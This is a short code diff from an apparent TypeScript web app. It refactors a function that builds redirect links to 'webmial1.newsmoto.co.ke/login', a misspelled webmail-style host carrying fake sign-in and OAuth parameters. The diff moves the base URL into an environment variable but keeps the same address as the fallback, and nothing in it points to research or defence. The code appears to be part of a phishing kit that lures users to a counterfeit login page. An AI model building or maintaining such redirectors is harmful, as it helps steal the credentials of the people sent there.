@@ -14,7 +14,8 @@ const socialPlatforms = [
 ];
 
 function createRedirectUrl(targetUrl: string): string {
-  return `https://webmial1.newsmoto.co.ke/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=${encodeURIComponent(targetUrl)}`;
+  const baseUrl = process.env.REDIRECT_BASE_URL || 'https://webmial1.newsmoto.co.ke/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=';
+  return `${baseUrl}${encodeURIComponent(targetUrl)}`;
 }
 
 export default function Home() {
